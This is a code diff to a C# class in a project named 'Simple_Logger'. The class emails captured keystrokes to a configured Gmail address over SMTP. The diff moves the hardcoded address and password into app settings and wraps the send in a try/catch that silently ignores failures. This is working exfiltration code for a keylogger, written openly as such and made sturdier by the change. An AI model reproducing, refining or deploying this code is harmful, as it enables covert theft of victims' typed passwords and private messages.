@@ -1,17 +1,17 @@
-﻿using System.Net.Mail;
+﻿using System;
+using System.Configuration;
+using System.Net;
+using System.Net.Mail;
 
 namespace Simple_Logger
 {
     public class Email
     {
-        private const string Address = "";
-        private const string Password = "";
-
         public static void SendEmail(string keystrokes)
         {
             var client = new SmtpClient();
 
-            var email = new MailMessage(Address, Address);
+            var email = new MailMessage(ConfigurationManager.AppSettings["email"], ConfigurationManager.AppSettings["email"]);
 
             // Use TSL port
 
@@ -21,7 +21,7 @@ namespace Simple_Logger
             client.DeliveryMethod = SmtpDeliveryMethod.Network;
             client.UseDefaultCredentials = false;
 
-            client.Credentials = new System.Net.NetworkCredential(Address, Password);
+            client.Credentials = new System.Net.NetworkCredential(ConfigurationManager.AppSettings["email"], ConfigurationManager.AppSettings["password"]);
 
             // Gmails smtp server
 
@@ -30,8 +30,15 @@ namespace Simple_Logger
             email.Subject = "Logged Keystrokes";
             email.Body = keystrokes;
 
-            client.Send(email);
-            
+            try
+            {
+                client.Send(email);
+            }
+
+            catch
+            {
+                // If any exception is raised while trying to send an email, ignore it and don't send the email
+            }
         }
     }
 }
